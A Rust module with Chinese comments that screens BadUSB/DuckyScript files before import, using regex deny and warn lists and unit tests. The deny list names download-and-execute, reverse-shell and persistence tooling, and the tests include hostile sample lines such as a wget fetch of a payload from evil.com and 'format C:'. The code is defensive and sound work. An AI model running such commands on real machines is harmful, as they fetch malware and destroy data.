// =============================================================================
// import/badusb_guard.rs - BadUSB 脚本内容安全审查器
// =============================================================================
// 职责：在 BadUSB 脚本导入前，扫描脚本内容，检测危险命令并告警/拦截
//
// 审查策略：
//   1. 危险命令黑名单（BLOCK）：检测到则拒绝导入
//   2. 可疑命令警告（WARN）：检测到则标记警告，但不阻止导入
//   3. 白名单教育脚本（SAFE）：确认为安全教育脚本
//
// 遵循用户协议：仅允许教育性脚本（画图/记事本输入），阻止恶意 payload
// =============================================================================

use std::path::Path;
use anyhow::{Result, bail};

/// 审查结果级别
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GuardLevel {
    /// 安全 — 教育性脚本，可导入
    Safe,
    /// 警告 — 含可疑命令，标记但允许导入（用户已通过法律警示和用户协议）
    Warn,
    /// 拦截 — 含危险命令，拒绝导入
    Block,
}

/// 审查结果
#[derive(Debug, Clone)]
pub struct GuardResult {
    pub level: GuardLevel,
    /// 检测到的危险/可疑命令列表
    pub findings: Vec<String>,
    /// 综合描述
    pub summary: String,
}

/// 危险命令黑名单（检测到 → Block）
/// 这些命令具有破坏性或可用于恶意攻击
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    (r"(?i)\bpowershell\b", "PowerShell 调用（可执行任意系统命令）"),
    (r"(?i)\bcmd\.exe\b", "CMD 调用（可执行任意系统命令）"),
    (r"(?i)\bwget\b", "wget 下载（可能下载恶意文件）"),
    (r"(?i)\bcurl\b", "curl 下载（可能下载恶意文件）"),
    (r"(?i)\bInvoke-WebRequest\b", "PowerShell 远程下载"),
    (r"(?i)\bInvoke-Expression\b", "PowerShell 动态执行（代码注入）"),
    (r"(?i)\bStart-Process\b", "PowerShell 进程启动"),
    (r"(?i)\breg\s+add\b", "注册表修改"),
    (r"(?i)\breg\s+delete\b", "注册表删除"),
    (r"(?i)\bnetsh\b", "网络配置修改（可开启远程访问）"),
    (r"(?i)\bshutdown\b", "关机命令"),
    (r"(?i)\bformat\b", "磁盘格式化"),
    (r"(?i)\bdel\s+/\w", "文件删除命令"),
    (r"(?i)\brmdir\b", "目录删除"),
    (r"(?i)\bmklink\b", "符号链接创建（可用于提权）"),
    (r"(?i)\bschtasks\b", "计划任务创建（可建立持久化后门）"),
    (r"(?i)\bcrontab\b", "Linux 计划任务"),
    (r"(?i)\bchmod\s+\+x\b", "Linux 可执行权限授予"),
    (r"(?i)\bnc\b.*-\w*l\w*", "Netcat 监听（后门/反弹 shell）"),
    (r"(?i)\bbash\s+-i\b", "Bash 交互式 shell"),
    (r"(?i)\bpython.*-c\b", "Python 内联执行（代码注入）"),
    (r"(?i)\beval\b", "动态代码执行"),
    (r"(?i)\bbase64\s+-d\b", "Base64 解码（常用于混淆恶意代码）"),
    (r"(?i)\bDownloadString\b", "PowerShell 远程下载执行"),
    (r"(?i)\bDownloadFile\b", "PowerShell 远程文件下载"),
];

/// 可疑命令警告列表（检测到 → Warn）
const SUSPICIOUS_PATTERNS: &[(&str, &str)] = &[
    (r"(?i)\bexplorer\b", "资源管理器打开（可能访问敏感目录）"),
    (r"(?i)\bnotepad\b", "记事本打开（教育用途常见，但可被滥用）"),
    (r"(?i)\bcalc\b", "计算器打开"),
    (r"(?i)\bmspaint\b", "画图打开"),
    (r"(?i)\bSTRING\s+DELAY\b", "DuckyScript DELAY 指令（可能用于时序攻击）"),
    (r"(?i)\bREPEAT\b", "DuckyScript REPEAT 指令"),
];

/// 安全教育脚本特征（检测到 → Safe）
const SAFE_PATTERNS: &[&str] = &[
    r"(?i)hello\s*world",
    r"(?i)heart",
    r"(?i)draw",
    r"(?i)paint",
    r"(?i)flipper",
    r"(?i)dolphin",
    r"(?i)tutor",
    r"(?i)教育",
    r"(?i)演示",
    r"(?i)教学",
];

/// 审查单个 BadUSB 脚本文件内容
pub fn inspect_content(filename: &str, content: &str) -> GuardResult {
    let mut findings: Vec<String> = Vec::new();
    let mut has_dangerous = false;
    let mut has_suspicious = false;
    let mut has_safe_marker = false;

    // 检测危险命令
    for (pattern, desc) in DANGEROUS_PATTERNS {
        if let Ok(re) = regex::Regex::new(pattern) {
            if re.is_match(content) {
                findings.push(format!("[BLOCK] {} — {}", filename, desc));
                has_dangerous = true;
            }
        }
    }

    // 检测可疑命令
    for (pattern, desc) in SUSPICIOUS_PATTERNS {
        if let Ok(re) = regex::Regex::new(pattern) {
            if re.is_match(content) {
                findings.push(format!("[WARN] {} — {}", filename, desc));
                has_suspicious = true;
            }
        }
    }

    // 检测安全教育脚本特征
    for pattern in SAFE_PATTERNS {
        if let Ok(re) = regex::Regex::new(pattern) {
            if re.is_match(content) {
                has_safe_marker = true;
                break;
            }
        }
    }

    // 综合判定
    let (level, summary) = if has_dangerous {
        (
            GuardLevel::Block,
            format!("检测到危险命令，已拒绝导入：{}", filename),
        )
    } else if has_suspicious && !has_safe_marker {
        (
            GuardLevel::Warn,
            format!("检测到可疑命令，请确认脚本安全性：{}", filename),
        )
    } else {
        (
            GuardLevel::Safe,
            format!("脚本内容审查通过：{}", filename),
        )
    };

    GuardResult {
        level,
        findings,
        summary,
    }
}

/// 审查目录下所有 .txt/.badusb 脚本文件
///
/// 返回：(总文件数, 拦截文件数, 警告文件数, 安全文件数, 所有发现)
pub fn inspect_directory(dir: &Path) -> Result<(usize, usize, usize, usize, Vec<String>)> {
    if !dir.exists() {
        return Ok((0, 0, 0, 0, vec![]));
    }

    let mut total = 0;
    let mut blocked = 0;
    let mut warned = 0;
    let mut safe = 0;
    let mut all_findings: Vec<String> = Vec::new();

    let entries = std::fs::read_dir(dir)?;
    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
        if ext != "txt" && ext != "badusb" && ext != "ducky" {
            continue;
        }

        total += 1;
        let filename = path.file_name().and_then(|n| n.to_str()).unwrap_or("unknown");
        let content = std::fs::read_to_string(&path).unwrap_or_default();
        let result = inspect_content(filename, &content);

        match result.level {
            GuardLevel::Block => {
                blocked += 1;
                all_findings.extend(result.findings);
                log::warn!("[badusb-guard] BLOCKED: {}", result.summary);
            }
            GuardLevel::Warn => {
                warned += 1;
                all_findings.extend(result.findings);
                log::warn!("[badusb-guard] WARN: {}", result.summary);
            }
            GuardLevel::Safe => {
                safe += 1;
                log::info!("[badusb-guard] SAFE: {}", result.summary);
            }
        }
    }

    Ok((total, blocked, warned, safe, all_findings))
}

/// 检查 BadUSB 资源包是否安全可导入
///
/// 在导入前调用，如果检测到危险命令则拒绝导入。
pub fn verify_badusb_package(package_dir: &Path) -> Result<()> {
    let (total, blocked, warned, _safe, findings) = inspect_directory(package_dir)?;

    if total == 0 {
        return Ok(());
    }

    log::info!(
        "[badusb-guard] 审查完成: {} 个脚本, 拦截 {}, 警告 {}, 安全 {}",
        total, blocked, warned, _safe
    );

    if blocked > 0 {
        let detail = findings
            .iter()
            .filter(|f| f.starts_with("[BLOCK]"))
            .cloned()
            .collect::<Vec<_>>()
            .join("\n");
        bail!(
            "BadUSB 脚本安全审查未通过：检测到 {} 个危险脚本，已拒绝导入。\n{}\n如确为教育用途，请移除危险命令后重试。",
            blocked, detail
        );
    }

    if warned > 0 {
        log::warn!(
            "[badusb-guard] {} 个脚本含可疑命令，已标记警告但允许导入",
            warned
        );
    }

    Ok(())
}

// ========================
// 单元测试
// ========================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_script() {
        let content = "STRING Hello World from DolphinTutor!";
        let result = inspect_content("hello.txt", content);
        assert_eq!(result.level, GuardLevel::Safe);
    }

    #[test]
    fn test_blocked_powershell() {
        let content = "STRING powershell -encodedcommand ...";
        let result = inspect_content("evil.txt", content);
        assert_eq!(result.level, GuardLevel::Block);
        assert!(!result.findings.is_empty());
    }

    #[test]
    fn test_blocked_wget() {
        let content = "STRING wget http://evil.com/malware.sh";
        let result = inspect_content("download.txt", content);
        assert_eq!(result.level, GuardLevel::Block);
    }

    #[test]
    fn test_warn_notepad() {
        let content = "STRING notepad";
        let result = inspect_content("open_notepad.txt", content);
        // notepad 在 SUSPICIOUS 中，但不含 SAFE 标记 → Warn
        assert_eq!(result.level, GuardLevel::Warn);
    }

    #[test]
    fn test_safe_notepad_with_education() {
        let content = "STRING notepad\nSTRING This is a DolphinTutor education demo";
        let result = inspect_content("demo.txt", content);
        // 含 notepad(WARN) + dolphin(SAFE) → Safe（安全标记覆盖）
        assert_eq!(result.level, GuardLevel::Safe);
    }

    #[test]
    fn test_blocked_format() {
        let content = "STRING format C:";
        let result = inspect_content("destructive.txt", content);
        assert_eq!(result.level, GuardLevel::Block);
    }
}
